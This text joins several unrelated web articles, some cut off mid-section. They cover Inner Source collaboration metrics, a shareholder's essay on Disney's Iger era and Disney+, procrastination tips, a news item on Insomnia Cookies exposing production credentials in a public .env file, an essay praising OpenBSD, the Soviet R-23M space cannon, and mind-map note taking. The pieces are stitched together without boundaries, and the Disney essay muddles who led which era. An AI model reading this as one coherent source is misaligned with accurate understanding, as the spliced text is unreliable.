<div><figure><img data-attachment-id="1390" data-permalink="https://toscalix.com/the_solution/" data-orig-file="https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg" data-orig-size="5658,1590" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="the_solution" data-image-description="" data-medium-file="https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=300" data-large-file="https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=656" src="https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=1024" alt="" srcset="https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=1024 1024w, https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=2048 2048w, https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=150 150w, https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=300 300w, https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>And hey, technically speaking, it would still be an African proverb, since I am from the Canary Islands, right?.</p>



<p>The idea behind the above sentence is to establish an <em>AND</em> relation between speed and collaboration meeting both, traditional corporate and Open Source (and Inner Source) goals. </p>



<p>Proving such positive correlation could be help to reduce the resistance offered by middle management to practice collaboration at scale either within Inner Source programs or Open Source projects. They would perceive such participation as a path to meet those longer term goals without contradicting many of the incentives they work with and they promote among their managees.</p>



<p>So the following question is, how we can do that? how can we provide evidences of such positive correlation in a language that is familiar to those managers?</p>



<p>The solution summarized: ISC Fall 2020</p>



<p>I tried to briefly explain to people running Inner Source programs, during the <a href="https://innersourcecommons.org/events/isc-fall-2020-agenda/">ISC Fall 2020</a>, a potential path to establish such relation in five not-so-simple steps. The core slide of my presentation enumerated them as:</p>



<p>1.- In addition to collaboration and community health metrics, I recommend to track product delivery process performance ones.<br>2.- Correlate both groups of metrics.<br>3.- Focus on decisions and actions that creates a positive correlation between them.<br>4.- Create a reporting strategy to developers and managers based on such positive correlation.<br>5.- Use such strategy to turn around your Inner Source/Open Source story: it is about creating positive business impact at scale through open collaboration.</p>



<p>A detailed explanation of these five points can be found in the second article of this series:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-7059cb082c69cf6b3aa3"><div><p>I've been a stockholder of Disney since birth, No, I'm not joking. My grandparents bought it for me as a gift the day I was born. The stock has increased ~10.2x since that year, 1994. No doubt, a solid return. In that same period, the Dow Jones has returned ~6.84x. Not too shabby of a choice by my grandparents when you look at the Dow Jones.</p><p>But what about the Nasdaq?</p><p>Well that's a different story. The NASDAQ has returned ~14.9x in the same time frame. The trend is tech stocks (most of which is in the NASDAQ) that outperformed non-tech stocks over the past 26 years.</p><p>The first 11 years of ownership were iffy at best. Then in 2005, Bob Iger, Disney's COO and president, was named CEO. Disney lost touch with its roots. It went from iconic brand to bureaucracy led by its dictator CEO, Michael Eisner. One of the most memorable failures was Disney Stores. <a href="https://dealbook.nytimes.com/2008/03/20/disney-stores-in-limbo-as-2004-deal-unravels/">A retail effort that cost the company $100MM+</a>. Mr. Iger changed that.</p><p><strong>The Bob Iger Era</strong></p><p>Bob Iger would bring Disney back to the Disney of old. The one that Walt Disney, founder of Disney, pioneered—centered around its famed animation studio.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605588997266_5292"><div><p>Roy Disney, nephew of Walt Disney, <a href="https://web.archive.org/web/20101224194554/http://www.countingdown.com/movies/30929/news?item_id=3822596">wrote upon the appointment</a> of Mr. Iger:</p><blockquote><p><em>"Animation has always been the heart and soul of The Walt Disney Company, and it is wonderful to see Bob Iger and the company embrace that heritage by bringing the outstanding animation talent of the Pixar team back into the fold. This clearly solidifies The Walt Disney Company's position as the dominant leader in motion picture animation and we applaud and support Bob Iger's vision."</em></p></blockquote><p>Bob Iger worked fast. In his first year, he bought <a href="https://money.cnn.com/2006/01/24/news/companies/disney_pixar_deal/">Pixar for $7.4B</a>. The acquisition brought along Steve Jobs, founder of Pixar, as a Disney board member. He also ended up becoming Disney's largest shareholder.</p><p>During his 15 years as CEO, Bob Iger transformed Disney through acquisitions: Marvel, Lucasfilm, creators of Star Wars, and 21st Century Fox</p><p>He brought Disney back to its roots—helping introduce the next generation to a new set of Disney characters: Walle-E, Elsa and Lightning McQueen.</p><p>These acquisitions and newly acquired fans helped Disney make a lot of money. In 2019, Disney <a href="https://www.forbes.com/sites/annabenyehudarahmanan/2020/01/06/disney-is-behind-seven-of-2019s-ten-highest-grossing-movies-in-north-america/?sh=1aa3e74156f0">produced seven of the top ten grossing films</a>—yielding more than $10B in ticket sales.</p><p>More importantly, he leveraged the success of the brands. He started with the parks. He built a Frozen-themed ride at Epcot. He <a href="https://insidethemagic.net/2020/04/its-a-small-world-ride-through-rwb1/">revamped</a> it's a Small World, to include more modern characters such as Moana.</p><p>He built a licensing empire. In 2018, Disney was the <a href="https://www.hollywoodreporter.com/news/disney-repeats-as-top-global-licensor-547b-retail-sales-1229916#:~:text=The%20Walt%20Disney%20Co.'s,from%20%2453%20billion%20in%202017.">top licensor</a> in the world. It earned $54.7B in retail sales on licensed merchandise. This isn’t easy. Netflix generates little revenue on licensing. It's attempt to create Stranger Things merchandise <a href="https://www.benzinga.com/media/19/07/14034053/cnbc-netflix-sees-no-profits-from-stranger-things-collectibles">failed miserably</a>.</p><p><strong>Content is the Fuel That Powers the Machine</strong></p><p>As Walt Disney's flywheel predicted more than 50 years ago, its content was the fuel that powered the machine. A machine with <a href="https://thewaltdisneycompany.com/the-walt-disney-company-reports-fourth-quarter-and-full-year-earnings-for-fiscal-2019/">$69.57B</a> in revenue in 2019 from four business segments:</p><ul data-rte-list="default"><li><p>Media Networks</p></li><li><p>Parks Experiences and Products</p></li><li><p>Studio Entertainment</p></li><li><p>Direct to Consumer and International</p></li></ul><p>But his most important contribution to the company came at the end of his tenure—launching Disney+. Bob Iger, didn't say it at the time, but he knew Disney needed to adopt. Disney's old model was reliant on others for distributions. It's content, both old and new needed consumers. It was mediums such as Netflix or movie theatres that brought the consumers. In the long run, this content not only cost Disney money, but cost them control of their audience.</p><p>On November 8th, 2018, Disney+ was announced. This would be the distribution that Disney needed. It would own its content and its audience.</p><p>On November 12th, 2019 Disney+ launched. The first day it had 10M subscribers. A year later, Disney+ now has 73.7M subscribers. It <a href="https://deadline.com/2020/08/disney-nears-5-year-streaming-goal-in-first-eight-months-with-57-5m-subscribers-1203003841/#:~:text=After%20rising%20from%2054.5%20million,would%20get%20to%20by%202024.">predicted 60M - 90M</a> subscribers by 2024—blowing away its own projections.</p><p>Bob Chapek, CEO of Disney, agreed with the future that Bob Iger laid out. He saw the success of Disney+ and knew the world was changing. If the last decade was about building the audience, the next decade would be about retaining the audience. At the core of that would be DTC (direct to consumer). Disney <a href="https://apnews.com/press-release/business-wire/travel-business-technology-lifestyle-bob-chapek-736055c7f51f457fa534bf9b5380bf35">wrote in a statement</a> to shareholders on October 12th, 2020:</p><blockquote><p><em>"In light of the tremendous success achieved to date in the Company’s direct-to-consumer business and to further accelerate its DTC strategy, The Walt Disney Company (NYSE: DIS) today announced a strategic reorganization of its media and entertainment businesses. Under the new structure, Disney’s world-class creative engines will focus on developing and producing original content for the Company’s streaming services, as well as for legacy platforms, while distribution and commercialization activities will be centralized into a single, global Media and Entertainment Distribution organization. The new Media and Entertainment Distribution group will be responsible for all monetization of content—both distribution and ad sales—and will oversee operations of the Company’s streaming services. It will also have sole P&amp;L accountability for Disney’s media and entertainment businesses."</em></p></blockquote><p><strong>Mulan As a Barometer</strong></p><p>Disney+ is positioned differently than Netflix. I like to describe it as "Netflix for Families”. What's most impressive about the launch is the lack of original content. Disney doesn't have a plethora of content for Disney+. It's only notable show is the Mandalorian. There is also a series of one-off exclusive content that has driven growth such as Hamilton and Mulan.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605588997266_11565"><div><p>The launch of Mulan, a live-action adaptation of the 1998 movie, is a barometer for the success of DTC. Due to COVID, movie theatre revenue has sharply declined. Disney could leverage Disney+ to skip theatres and release it straight to consumers. Even better, it would keep 100% of the revenue it would earn.</p><p>Disney charged $29.99 to watch (in addition to the monthly subscription fee). It's unclear how Mulan performed. Some reports indicate revenue upward of <a href="https://www.cbr.com/mulan-estimates-disney-gamble-massive-payday/">$250MM</a> while other data suggests numbers in the <a href="https://www.ign.com/articles/did-mulans-vod-sales-beat-tenets-global-box-office">$60MM - $90MM range</a>.</p><p>Honestly, who cares? Even if Disney+ made $60M (revenue estimate 11 days after release), it doesn't tell the whole story. It doesn't give insight to the millions of new subscribers Disney+ earned. Ultimately, resulting in millions of dollars in additional revenue for the company.</p><p>And this is the point, isn't it? Disney's strategy isn't a one-off, but holistic. Every movie release isn't just one-off revenue from a movie sale, but represented by billions of dollars in recurring revenue. Even if Disney lost money on Mulan initially, it gives them more data. This helps to figure out the content people watch and how to optimize it for maximum revenue. <a href="https://www.arilewis.com/aris-posts/netflixs-biggest-competitor-is-choice">Last week, I wrote about how Netflix's algorithm saved it $1B a year</a>:</p><blockquote><p><em>"Netflix has spent millions if not billions on their recommendation algorithm.</em><a href="https://mobilesyrup.com/2017/08/22/80-percent-netflix-shows-discovered-recommendation/" target="_blank"><em> 80% of watched content</em></a><em> is based on recommended content. Netflix's former chief product officer wrote in a 2016 paper that the algorithm</em><a href="https://www.tubefilter.com/2016/06/20/netflix-recommendation-engine-algorithm/" target="_blank"><em> saves Netflix over $1B a year</em></a><em>. Netflix</em><a href="https://www.businessinsider.com/how-long-netflix-thinks-it-takes-to-choose-content-2016-2" target="_blank"><em> only has 90 seconds</em></a><em> to suggest content to a user before it leaves—underlying the importance of the algorithm."</em></p></blockquote><p>Disney's CEO, Bob Chapek, in their Q4 earnings call didn't share specific data, but announced they were "<a href="https://deadline.com/2020/11/mulan-pvod-bob-chapek-revenue-viewership-1234613878/">pleased with the results</a>".</p><p><strong>What Disney+'s Success Means?</strong></p><p>It's very rare for a behemoth like Disney not only to reinvent itself, but succeed in the way they have. Even more impressive is in the time frame in which they've done it. Disney+'s success has surpassed even the most optimistic expectations of any analyst.</p><p>Disney has spent 50+ years building some of the most iconic brands in the world. Brands such as Mickey Mouse and Snow White. It then leveraged those brands to create diversified revenue streams: merchandise, amusement parks and more.</p><p>Somewhere along the way, they got lost. Bob Iger was their guiding light and Bob Chapek drove the car that got them there.</p><p>Disney's revitalization is a lesson to all. It's not only about content, but what you do with that content. Can you distribute it? Can you monetize the IP? Ultimately, how do you create the best content that makes the most money?</p><p>I am excited for the future of Disney. I continue to remain a shareholder. It's new direct to consumer strategy is exactly what Walt Disney would have wanted: using content to fuel the flywheel. </p></div></div></div>]]>

                    <p>I often always be intimidated by my to-do list. Usually, I procrastinate, hoping post deferments I will feel better and can finish the task. It is a silly thing to do because deferment will make me feel much more horrible. I know what the issue is and how to work around it. But procrastination is always on the way and is still my default reaction.</p><p>Tackling procrastination are obvious yet not so obvious. Enough <a href="https://hn.algolia.com/?q=procrastinate">articles </a>are discussing procrastination. I put my pieces here, which some based on those existing ideas in countless articles and books. So here we go, the steps on how not to procrastinate, so that I can always refer back here if any of my current or future tasks resort to procrastination.</p><ol><li>Eat the elephant, split big tasks into smaller</li><li>Write first awful draft and iterate</li><li>Beat the resistance by just starting out</li></ol><h2 id="eat-the-elephant">Eat The Elephant</h2><p>Eat the elephant is the first step. Many tasks feel big because... it is big. Split it into manageable chunks. As one person working in software industries for more than a decade, this should be natural for me. One starts with writing <a href="https://en.wikipedia.org/wiki/User_story">a story</a>. Then define tasks to accomplish the story. Define subtasks if needed. The intuition is, an elephant is too big. You can't eat it in one swallow. But it will be edible if you eat piece by piece where you can chew it chunk by chunk. </p><p>Example: writing a thesis. The one task that I am starting. It is so big—so many tasks. I am beginning frozen. I don't know what to do first. Break the ideas of the tasks as a starter. I am starting again to use mindmap recently, and it is quite helpful in breaking up ideas and actions to take. I use <a href="http://gitmind.com/">gitmind</a>, the best of a few I have tried. Following is the very first version of my thesis mindmap. It is still big, but I can see the manageable chunks, which I can try to chew bit by bit.</p><figure><img src="http://blog.lamida.org/content/images/2020/11/image.png"></figure><p>As additional note, in conventional school, an advisor will give you manageable milestones that help you further in eating the elephant.</p><h2 id="write-the-first-awful-first-version-draft">Write The First Awful First Version Draft</h2><p>This idea is not always necessary only about writing. I often want to procrastinate because I keep hoping that I will continuously produce an excellent first version. First version awesome blog post. First version great software piece. I wish I can always create something amazing all the time, but I feel that it shouldn't be the case. I believe even some great people wouldn't always produce a masterpiece. That's why they call it a masterpiece. If a masterpiece is all over, we will not call it a masterpiece anymore.</p><p>In an article about writing that I don't remember which one is, it tells to aim to write awful writing once a day. Or, in other words, write a daily crappy writing. Accept the fact that your first output will most probably always be awful. However, do iteration based on a feedback loop. See what went well, and keep it up. See what can be improved and make small chunks of improvement. The more you do it, your first draft wouldn't be so awful anymore.</p><p>One example is this blog post. This is the first time I am writing directly in the Ghost editor without overthinking how awful my post will be. I just want to write points to clarify my thoughts to refer to again in the future.</p><h2 id="beat-the-resistance">Beat The Resistance</h2><blockquote>“If you find yourself asking yourself (and your friends), "Am I really a writer? Am I really an artist?" chances are you are. The counterfeit innovator is wildly self-confident. The real one is scared to death.”― Steven Pressfield, The War of Art: Break Through the Blocks &amp; Win Your Inner Creative Battles</blockquote><p>Even after understanding and accepting your first version (be it writing, software, work in progress task) will be awful. You need to start. To start, you need to beat what Steven Pressfield called resistance. How to beat resistance? Just start. Yes, this is cyclic. To break the cycle, you just need to start.</p><p>According to many procrastination books (sorry, I can't quote because I don't remember the specific reference), anticipating to start a task often much more difficult than actually starting the task itself.</p><p>For example, I have been procrastinating my <a href="https://istd.sutd.edu.sg/courses/mssd/machine-learning/">Machine Learning</a> homework that dues tomorrow because I just feel not good about starting for multiple reasons. I still don't understand most of the concepts in the past three lectures. I wish I can start after I know all of them. This blog post is one way for me to defer myself from doing my homework. I am pretty sure that once I start, it won't be so bad.</p><h2 id="sometime-you-just-need-to-procrastinate">Sometime You Just Need to Procrastinate</h2><p>This statement is based on a conversation with my friend. He has done his PhD and advice on tackling procrastination from PhD is always the best one.</p><blockquote>Productivity is a wave! Don't feel guilty when you are in an antinode and take care of your wellbeing when you are in a node!</blockquote><p>That's what he said referring to this twitter post.</p><!--kg-card-begin: html--><blockquote>— Dr Zoë Ayres (@ZJAyres) <a href="https://twitter.com/ZJAyres/status/1280536086322786304?ref_src=twsrc%5Etfw">July 7, 2020</a></blockquote> <!--kg-card-end: html--><p>So there is a time when one will feel not good to start. Don't feel guilty too much about it. But don't wait for the perfect starting time. Just try to start, even if you feel good a bit. It wouldn't be so bad once you start.</p><p>Post image is taken from <a href="https://unsplash.com/photos/dtSCKE9-8cI">here</a>.</p>

<p>American bakery company <em>sweetly</em> remembered for its late-night warm cookie trucks across college campuses was caught leaking sensitive data on its website.</p>



<p>The data exposed via public <code>.env</code> files included production server database credentials, including the DB server addresses, ports, usernames, passwords, and API keys.</p>



<p><code>.env</code> files contain sensitive configuration data such as environment variables, API keys, passwords, and are supposed to remain private, hidden from prying eyes of the public.</p>



<p>The exposed <em>.env</em> file provided enough information for an attacker to potentially be able to access the Insomnia Cookies database and carry all sorts of attacks, such as dropping entire databases, or illicitly obtaining the information contained within them, such as customer data.</p>



<figure><img src="https://pbs.twimg.com/media/EnC8cEWXEAE2PfB?format=jpg&amp;name=large" alt="Image"><figcaption>Source: Bob Diachenko </figcaption></figure>



<p>Bob Diachenko, Cyber Threat Intelligence researcher who discovered the flaw on November 12th via public IoT search engines (such as Shodan), responsibly reported it to Insomnia Cookies.</p>



<p>However, Diachenko didn’t receive a response. And it seems, Insomnia Cookies quietly patched the flaw following Diachenko’s report.</p>



<p>“Insomnia Cookies left almost all of their prod credentials exposed via publicly accessible dot-env file on one of its IPs (indexed by all IoT search engines). Silently secured after responsible disclosure, no response,” <a href="https://twitter.com/MayhemDayOne/status/1328769354318688257" target="_blank" rel="noreferrer noopener">tweeted</a> Diachenko.</p>



<p>Diachenko told <em>Security Report</em> he had discovered the data leak last week via public IoT search engines and immediately reported it to Insomnia Cookies:</p>



<p>“I discovered that one on Nov 12th and immediately sent alert to IC.”</p>



<p>“Basically, dot-env is environment variables file for internal usage only. Developers define here settings for databases and endpoints so if you have this, most of the company’s infrastructure is compromised,” Diachenko told <em>Security Report</em>.</p>



<p>When building and publishing websites to production environment, it may be wise to check file permissions, to prevent data leaks such as this one.</p>



<p><em>Security Report</em> has reached out to Insomnia Cookies for comment but haven’t heard back yet.</p>

  <p>In this article I will share my opinion about things I like in
OpenBSD, this may including a short rant about recent open source
practices not helping non-linux support.</p>

<h3 id="privacy">Privacy</h3>

<p>There is no telemetry on OpenBSD. It’s good for privacy, there is
nothing to turn off to disable reporting information.</p>

<p>The default system settings will prevent microphone to record sound
and the webcam can’t be accessed without user consent because the
device is root’s by default.</p>

<h3 id="securefirefoxchromium">Secure firefox / chromium</h3>

<p>While the security features added to the market dominating web
browsers <strong>can be cumbersome sometimes</strong>, this is really a game
changer compared to others systems. The web browsers should be able to
only retrieve files in a few user defined directories, like
<code>~/Downloads</code> or <code>/tmp/</code> by default and some others directories
required for the browsers to work.</p>

<p>This means your <code>~/.ssh</code>, <code>~/Documents</code> and everything else can’t be
read by an exploit in a web browser.</p>

<p>It’s possible to replicate this on Linux using AppArmor, but it’s
absolutely not out of the box and requires a lot of tweaks from the
user to get an usable Firefox. I did try, it worked but it requires a
very good understanding of the Firefox needs and AppArmor profile
syntax to get it to work.</p>

<h3 id="pffirewall">PF firewall</h3>

<p>With this firewall, I can quickly check the rules of my desktop or
server and understand what they are doing.</p>

<p>I also use a lot the bandwidth management feature to throttle the
bandwidth some programs can use which doesn’t provide any rate
limiting. This is very important to me. Linux users could use the
software <code>trickle</code> for this.</p>

<h3 id="itsstable">It’s stable</h3>

<p>Apart from the use of some funky hardware, OpenBSD has proven me being
very stable and reliable. I can easily reach two weeks of uptime on my
desktop with a few suspend/resume every day. My servers are running
24/7 without incident for years.</p>

<p>I rarely go further than two weeks on my workstation because I run
current and this means it’s time to upgrade.</p>

<h3 id="lowmaintenance">Low maintenance</h3>

<p>Keeping my OpenBSD up-to-date is very easy. I run syspatch and pkg_add
-u twice a day to keep the system up to date. A release every six
months requires a bit of work.</p>

<p>Basically, upgrading every six months looks like this, except some
specific instructions explained in the upgrade guide (database server
major upgrade for example):</p>

<pre><code># sysupgrade
[..wait..]
# pkg_add -u
# reboot
</code></pre>

<h3 id="documentationisaccurate">Documentation is accurate</h3>

<p>Setting up an OpenBSD system with full disk encryption is easy.</p>

<p>Documentation to create a router with NAT is explained step by step.</p>

<p>Every binary or configuration file have their own up-to-date man page.</p>

<p>The FAQ, the website and the man pages should contain everything one
needs. This represents a lot of information, it may not be easy to
find what you need, but it’s there.</p>

<p>If I had to be without internet for some times, I would prefer an
OpenBSD system. The embedded documentation (man pages) should help me
to achieve what I want.</p>

<p>Consider configuring a router with traffic shaping on OpenBSD and
another one with Linux without Internet access. I’d 100% prefer read
the PF man page.</p>

<h3 id="contributingiseasy">Contributing is easy</h3>

<p>This has been a hot topic recently. I very enjoy the way OpenBSD
manage the contributions. I download the sources on my system,
anywhere I want, modify it, generate a diff and I send it on the
mailing list. All of this can be done from a console with tools I
already use (git/cvs) and email.</p>

<p>There could be an entry barrier for new contributors: you may feel
people replying are not kind with you. <strong>This is not true.</strong> If you
sent a diff and received critics (reviews) of your code, this means
some people spent time to teach you how to improve your work. I do
understand some people may feel it rude, but it’s not.</p>

<p>This year I modestly contributed to the projects
<a href="https://www.openindiana.org/">OpenIndiana</a> and
<a href="https://nixos.org/">NixOS</a>, this was the opportunity to compare how
contributions are handled. Both those projects use github. The
work flow is interesting but understanding it and mastering it is
extremely complicated.</p>

<p>One has to make a github account, fork the project, create a branch,
make the changes for your contribution, commit locally, push on the
fork, use the github interface to do a merge request. This is only the
short story. On NixOS, my first attempt ended in a pull request
involving 6 months of old commits. With good documentation and
training, this could be overcome, and I think this method has some
advantages like easy continuous integration of the commits and easy
review of code, but it’s a real entry barrier for new people.</p>

<h3 id="highqualitypackages">High quality packages</h3>

<p>My opinion may be biased on this (even more than for the previous
items), but I really think OpenBSD packages quality is very high. Most
packages should work out of the box with sane defaults.</p>

<p>Packages requiring specific instructions have a README file installed
with them explaining how to setup the service or the quirks that could
happen.</p>

<p>Even if we lack some packages due to lack of contributors and time (in
addition to some packages relying too much on Linux to be easy to
port), major packages are up to date and working very well.</p>

<p>I will take the opportunity of this article to publish a complaint
toward the general trend in the Open Source.</p>

<ul>
<li><p>programs distributed only using flatpak / docker / snap are really
 Linux friendly but this is hostile to non Linux systems. They often
 make use of linux-only features and the builds systems are made for
 the linux distribution methods.</p></li>
<li><p>nodeJS programs: they are made out of hundreds or even thousands of
 libraries often working fragile even on Linux. This is a real pain
 to get them working on OpenBSD. Some node libraries embed rust
 programs, some will download a static binary and use it with no
 fallback solution or will even try to compile source code instead of
 using that library/binary from the system when installed.</p></li>
<li><p>programs using git to build: our build process makes its best to be
 clean, the dedicated build user *<em>HAS NO NETWORK ACCESS</em> and won’t
 run those git commands. There are no reasons a build system has to
 run git to download sources in the middle of the build.</p></li>
</ul>

<p>I do understand that the three items above exist because it is easy
for developers. But if you write software and publish it, that would
be very kind of you to think how it works on non-linux systems. Don’t
hesitate to ask on social medias if someone is willing to build your
software on a different platform than yours if you want to improve
support. We do love BSD friendly developers who won’t reject OpenBSD
specifics patches.</p>

<h3 id="whatiwouldliketoseeimproved">What I would like to see improved</h3>

<p>This is my own opinion and doesn’t represent the OpenBSD team members
opinions. There are some things I wish OpenBSD could improve there.</p>

<ul>
<li>Sndiod support for separates in/out devices (I have an usb
 microphone and an usb DAC and I can’t use them for audio conference)
 (<a href="https://marc.info/?l=openbsd-tech&amp;m=160562971904202&amp;w=2">a patch</a>
 was sent the next after this article was published)</li>
<li>Better ARM support</li>
<li>Wifi speed</li>
<li>Better performance (gently improving every release)</li>
<li>FFS improvements in regards to reliability (I often get files in
 lost+found)</li>
<li>Faster pkg_add -u</li>
<li>hardware video decoding/encoding support</li>
<li>better FUSE support and mount cifs/smb support</li>
<li>scaling up the contributions (more contributors and reviewers for
 ports@)</li>
</ul>

<p>I am aware of all the work required here, and I’m certainly not the
person who will improve those. This is not a complain but wishes.</p>

<p>Unfortunately, everyone knows OpenBSD features come from hard work and
not from wishes submitted to the developers :)</p>

<p>When you think how little the team is in comparison to the other
majors OS, I really think a good and efficient job is done there.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the decades since the fall of the Soviet Union, many Americans have taken to assuming that victory for the United States was assured. From our vantage point in the 21st century, we now know that the <a href="https://www.sandboxx.us/blog/the-soviet-dome-of-light-cold-war-weapon-mystery/">Soviet Union</a> was, in many ways, a quagmire of oppression and economic infeasibility — but in the early days of mankind’s effort to reach the stars, it was <em>the Soviets</em>, not the Americans, who seemed destined for the top spot.</p><p>On October 4, 1957, it was the Soviet Union that first successfully placed a manmade object in orbit around the earth, with Sputnik. Less than a month later, the Soviets would capture <a href="https://www.space.com/17764-laika-first-animals-in-space.html" target="_blank" rel="noreferrer noopener">another</a> victory: Launching a stray dog named Laika into orbit. While the dog would die as it circled our planet, Laika’s mission seemed to prove (at least to some extent) that space travel was possible for living creatures. On September 14, 1959, the Soviet space probe Luna II would be the first manmade object to land on the moon, but the Soviet’s greatest victory was yet to come.</p><h2>When the Soviets were winning the Space Race</h2><div><figure><picture>

<figcaption>Soviet Cosmonaut Yuri Gagarin (WikiMedia Commons)</figcaption></figure></div><p>On April 12, 1961, the Soviet Union once again affirmed to the world that they were the global leader in space technology, launching cosmonaut Yuri Gagarin into orbit where he remained for 108 minutes before reentering the earth’s atmosphere.</p><p>To the Americans, these early victories in the Space Race were about far more than international prestige. Each victory for the <a href="https://www.sandboxx.us/blog/how-a-teenager-with-a-cessnas-insane-trip-helped-topple-the-soviet-union/">Soviets</a> not only represented a greater lead in securing “the ultimate high ground” for the Soviet military, they also served as proof of the validity of the Soviet Communist economic and political model — making the Soviet space program as much an ideological threat as it was a military one.</p><p>Despite assuming an underdog status in the early days of the Space Race, however, the U.S. leveraged its post-World War II industrial and economic might to begin closing the gap created by these early Soviet victories, launching their own satellite less than four months after Sputnik. America’s first astronaut in space, Alan Shepard, would follow behind the Soviet Gagarin by less than a month.</p><h2>America’s come-from-behind victory</h2><div><figure><picture>

<figcaption>Buzz Aldrin on the moon (NASA)</figcaption></figure></div><p>By 1969, America’s technological prowess, coupled with a massive influx of spending, would secure victory for both the U.S. and, in the minds of many, its capitalist economic model. On July 20, 1969, two former fighter pilots, Neil Armstrong and Buzz Aldrin, triumphantly landed on the moon.</p><p>Just like that, the Soviets went from leading the way in orbital space to lagging behind, and in the midst of an ongoing nuclear arms race, the Soviets saw this shift as a significant threat. Furthering their concern were reports of the American Manned Orbital Laboratory (MOL) program, which was intended as an early space station from which crews could conduct orbital surveillance, or even mount operations against Soviet orbital bodies.</p><p>In response to the MOL program, the Soviets poured funding into Almaz, which was an early space station design of their own. Hidden behind a public-facing civilian space station effort, the program called for a number of military-specific space stations in orbit around the earth, each capable of conducting its own high-altitude reconnaissance. Although the Americans canceled their MOL program in 1969, the Soviet effort continued, reaching even further beyond America’s canceled program with plans to equip these space stations with the world’s <em>first ever cannon in space</em>.</p><h2>The Soviet Space Cannon: R-23M Kartech</h2><p>The Soviets were not mistaken when they considered America’s MOL program a threat. In fact, within the corridors of the Pentagon, a number of plans and strategies were being explored that would enable the Americans to spy on, capture, or otherwise destroy Soviet satellites.</p><p>It was with this in mind that the Soviet Union decided they’d need to equip their space stations for more than just taking pictures of the earth below. Instead, they wanted to be sure their orbital habitats could <em>fight</em> whatever the Americans threw their way.</p><div><figure><picture>

<figcaption>Soviet Tu-22PD tail turret equipped with a R-23M (WikiMedia Commons)</figcaption></figure></div><p>Engineer Aleksandr Nudelman and his team at KB Tochmash changed the design of the cannon to utilize smaller 14.5-millimeter rounds that could engage targets at distances of up to two miles with a blistering rate of fire of somewhere between 950 and 5,000 rounds per minute (depending on the source you read). According to reports made public after the fall of the Soviet Union, the cannon successfully punctured a metal gas can from over a mile away during ground testing.</p><p>The cannon was to be mounted in a fixed position on the underbelly of the Soviet Almaz space stations, forcing operators to move the entire 20-ton station to orient the barrel toward a target. The weapon system was first <a href="https://www.wearethemighty.com/history/soviet-space-cannon-in-orbit?rebelltitem=3#rebelltitem3" target="_blank" rel="noreferrer noopener">affixed</a> to a modified Soyuz space capsule, which was then dubbed the “Salyut” space station, and launched in 1971. By the time the Salyut was in orbit, however, interest in these manned reconnaissance platforms was already beginning to wane inside the Kremlin, as unmanned reconnaissance satellites seemed more practical.</p><h2>The only cannon ever fired in space</h2><p>While American intelligence agencies were well aware of the Soviet plan to field military space stations, it was still extremely difficult to know exactly what was going on in the expanse of space above our heads. Under cover of extreme secrecy, the Soviet Union <a href="https://www.popularmechanics.com/military/weapons/a18187/here-is-the-soviet-unions-secret-space-cannon/" target="_blank" rel="noreferrer noopener">successfully</a> completed a test firing of the R-23M on Jan. 24, 1975 in orbit above the earth. There was no crew onboard at the time, and the exact results of the test remain classified to this day. Uncomfirmed reports indicate that the weapon fired between one and three bursts, with a total of 20 shells expended. In order to offset the recoil of the fired rounds, the space station engaged its thrusters, but it stands to reason that the test may have been a failure.</p><div><figure><picture>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p>Since high school I've never had a paper notebook. Don't get me wrong: I'm not one or these people with very good memory and don't need any notes whatsoever. On the contrary.</p>
<p>The thing is I've never seen much value in note taking. At least in the traditional way, with paragraphs and blocks of text. I can't memorize these chunks of text and, if I want to dive deep into a subject, I'm much better off reading text books or browsing Wikipedia articles. </p>
<p>In fact, I've never trusted my own notes. Maybe I got it wrong in the first place. Maybe the way I wrote is ambiguous. Ultimately, the bigger the notes, more likely they can lead me to wrong conclusions. </p>
<h3 id="the-need">The need</h3>
<p>However, sometimes I want to refresh my memory on a particular subject and reading books and articles is too time consuming. I just want to recap the absolute essential — things I shouldn't forget. Some minimal notes surely would come in handy. </p>
<p>I researched for cheap yet effective note taking methods. I tried <a href="https://en.wikipedia.org/wiki/Cornell_Notes">Cornell notes</a> but they didn't do the trick for me. Then I tried <a href="https://en.wikipedia.org/wiki/Mind_map">mind maps</a> and I really liked it. </p>
<figure>
    <img src="https://user-images.githubusercontent.com/3226564/99436292-1389eb80-28f0-11eb-8fff-19f085e23c41.png">
    <figcaption>A typical mind map. Source: <a href="https://mindmapping.com/" target="_blank">mindmapping.com</a></figcaption>
</figure>
<p>What I fancy about mind maps is that they are extremely minimalist and favor connection of ideas. It's also possible to adjust the level of details you want to write/read by determining how deep into the nodes you want to dive. </p>
<h3 id="first-experience">First experience</h3>
<p>The first time I used mind maps for real was when I was studying for a software engineering interview in a big tech company. </p>
<p>For an Algorithm question in general you need to know beforehand what's the better strategy for solving it. Should it use a graph? Or a linked list? When faced with such a problem it isn't trivial to know how to solve it but if you ask yourself "would graphs work here?" you generally have an immediate yes/no. A mind map —either in paper or in your brain— with all the possibilities makes things much easier. </p>
<h3 id="the-objective">The objective</h3>
